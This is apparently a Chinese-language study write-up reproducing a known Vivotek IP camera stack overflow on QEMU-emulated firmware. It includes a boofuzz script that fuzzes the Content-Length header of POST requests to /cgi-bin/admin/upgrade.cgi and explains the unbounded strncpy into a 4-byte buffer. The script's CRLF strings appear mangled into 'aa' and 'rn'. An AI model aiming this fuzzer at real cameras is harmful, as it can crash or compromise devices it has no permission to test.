# Vivotek IP Cameras - Remote Stack Overflow复现

虽说是漏洞复现，但这里学习的思想是boofuzz的使用。因为要用boofuzz在44AW上，所以得提前学习一下。正好IoT课上也推荐这个工具，不如直接用来做一下。

目标固件解压：

![目标固件binwalk探测与解压](F:\Target\CC8160-VVTK-0100d.flash\目标固件binwalk探测与解压.png)

17年那会儿很多厂商都不对固件加密，一看全是压缩包，这对破解人员来说真好。binwalk直接解压。

解压后，直奔漏洞代码，使用qemu挂载启动。这里需要解决的一些兼容性bug很多，还好网上有相关资料，可以快速找相关指令解决。我对44AW也做了相同的挂载，但报错没有依据，得手工解决。

![挂载目标进程并启动](F:\Target\CC8160-VVTK-0100d.flash\挂载目标进程并启动.png)

成功访问，手工注入试试漏洞点

![](F:\Target\CC8160-VVTK-0100d.flash\访问成功.png)

抓到的都是GET的包，那只能自己写个POST的用Content-Length参数传上去。成功让内核崩溃了。

![post包参数contentlength使内核崩溃](F:\Target\CC8160-VVTK-0100d.flash\post包参数contentlength使内核崩溃.png)

然后，用用boofuzz来看看这个漏洞，脚本如下：

```
from boofuzz import *
IP = "127.0.0.1"
PORT = 80

def check_response(target,fuzz_data_logger,session,*args,**kwargs):
    fuzz_data_logger.log_info("Checking for response ...")
    try:
        response = target.recv(512)
    except:
        fuzz_data_logger.log_fail("Unable to connect ...")
        return
    if not response:
        fuzz_data_logger.log_fail("Empty response ...")
        target.close()
        return
    fuzz_data_logger.log_info("Start checking ...n"+response.decode())
    target.close()
    return

def main():
    session = Session(
        target=Target(connection=SocketConnection(IP,PORT,proto="tcp"),
        ),
        post_test_case_callbacks=[check_response],
    )
    s_initialize(name="FUZZ")
    with s_block("Request-Line"):
        # Method
        s_group("Method",["POST"])
        s_delim(" ",fuzzable=False)
        s_string("/cgi-bin/admin/upgrade.cgi ",fuzzable=False,name="URI")
        s_static("HTTP/1.1",name="Version")
        s_static("aa",name="CRLF")
        # Host
        s_static("Host")
        s_delim(": ",fuzzable=False)
        s_string("127.0.0.1",fuzzable=False,name="IP")
        s_static("rn")
        # Connection
        s_static("Connection")
        s_delim(": ",fuzzable=False)
        s_string("Close",fuzzable=False,name="Active")
        s_static("rn")
        # Content-Length
        s_static("Content-Length")
        s_delim(": ", fuzzable=False)
        s_string("66", fuzzable=True)
        # End
        s_static("aa")
        s_static("aa")

    session.connect(s_get("FUZZ"))
    session.fuzz()

if __name__=="__main__":
    main()
```

用chatGPT也能写类似脚本，感受到了AI的强大。

触发payload拿下:

![boofuzz拿下漏洞](F:\Target\CC8160-VVTK-0100d.flash\boofuzz拿下漏洞.png)

好了，然后以类似思路在44AW摄像头上边测一测。不过由于boofuzz的特点是检测到崩溃就停止，所以定义什么样的崩溃比较难弄，最后还是会回到代码审计的工作上。

下方是Vivotek IP Cameras的漏洞代码。基本逻辑是：读取haystack里的数据，识别到POST字段后进入下方if（v22）的判断，然后识别Content-Length字段的位置。

这里使用了strncpy函数，虽然strncpy是有了长度限制，但这里的逻辑是从识别到Content-Length字段后一直往后读取字节直到结束。很不幸的是，dest是一个4字节的数组。由于缺少了对最大长度的判断，导致了栈溢出漏洞的情况。

![漏洞代码](F:\Target\CC8160-VVTK-0100d.flash\漏洞代码.png)

